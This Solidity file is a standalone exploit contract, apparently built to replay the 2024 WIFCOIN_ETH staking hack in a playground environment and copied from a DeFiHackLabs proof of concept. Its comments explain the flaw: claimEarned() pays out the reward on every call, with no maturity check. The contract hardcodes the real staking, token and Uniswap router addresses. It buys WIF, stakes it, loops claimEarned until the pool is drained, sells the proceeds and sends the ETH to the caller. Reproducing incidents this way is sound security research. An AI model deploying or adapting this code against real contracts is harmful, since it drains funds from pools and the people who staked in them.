// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-06-WIFCOIN_ETH).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (WIFCOIN_ETHExploit extends BaseTestWithBalanceLog; testExploit() IS the attack,
// with `address(this)` acting as both attacker and profit receiver, funded via
// `vm.deal(this, 0.3 ether)`) -- there is no standalone exploit contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack (buy WIF ->
// stake -> loop claimEarned until it reverts -> sell WIF -> forward the proceeds to
// the caller) so the playground can deploy it and record run(). The 0.3 ETH war
// chest is seeded into this contract via the config's `setup` (mirrors vm.deal +
// forwarding the flash amount in), replacing the cheatcode. Logic and constants are
// copied verbatim from test/WIFCOIN_ETH_exp.sol::testExploit().
//
// Root cause: WIFStaking.claimEarned() pays out `amount * apr / 10000` on EVERY call
// with no maturity gate (unlike earnedToken/unstake, which both require
// `endstakeAt <= block.timestamp`) and no claimed/last-claim ledger. Looping the call
// re-mints the full APR% of the stake every iteration until the contract's WIF
// balance is exhausted (SafeMath underflow on the payout transfer stops the loop).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface Uni_Router_V2 {
    function WETH() external view returns (address);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface WIFStaking {
    function stake(uint256 _stakingId, uint256 _amount) external;
    function claimEarned(uint256 _stakingId, uint256 _burnRate) external;
}

contract WIFCOINDrain {
    WIFStaking constant WifStake = WIFStaking(0xA1cE40702E15d0417a6c74D0bAB96772F36F4E99);
    IERC20 constant Wif = IERC20(0xBFae33128ecF041856378b57adf0449181FFFDE7);
    Uni_Router_V2 constant router = Uni_Router_V2(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));

    uint256 constant ETH_FLASH_AMT = 0.3 ether;

    receive() external payable {}

    // step 0: buy WIF with the 0.3 ETH war chest already sitting in this contract
    // (seeded by the config's `setup`, mirroring the test's vm.deal'd 0.3 ETH),
    // stake it, loop the un-gated claimEarned() until the pool is drained, sell the
    // harvested WIF, and forward all resulting ETH to the caller.
    function run() external {
        Wif.approve(address(router), type(uint256).max);
        Wif.approve(address(WifStake), type(uint256).max);

        address[] memory buyPath = new address[](2);
        buyPath[0] = router.WETH();
        buyPath[1] = address(Wif);
        address[] memory sellPath = new address[](2);
        sellPath[0] = buyPath[1];
        sellPath[1] = buyPath[0];

        // step 1: buy WIF with the 0.3 ETH war chest.
        router.swapExactETHForTokens{value: ETH_FLASH_AMT}(0, buyPath, address(this), block.timestamp);

        // step 2: stake the entire WIF balance into plan 3 (apr 600 = 6%, 180-day lock).
        WifStake.stake(3, Wif.balanceOf(address(this)));

        // step 3: claimEarned() never checks endstakeAt, so the flat 6%-of-principal
        // reward is re-mintable on every call. Loop until the staking contract's WIF
        // balance can no longer cover the payout (SafeMath underflow -> revert ->
        // caught, breaking the loop).
        while (true) {
            try WifStake.claimEarned(3, 10) {}
            catch {
                break;
            }
        }

        // step 4: cash out all harvested WIF back into ETH via the WIF/WETH pair.
        router.swapExactTokensForETH(Wif.balanceOf(address(this)), 0, sellPath, address(this), block.timestamp);

        // step 5: forward all ETH proceeds to the caller (the attacker EOA), so the
        // recorder's post-attack balance delta on the attacker is the net profit.
        payable(msg.sender).transfer(address(this).balance);
    }
}
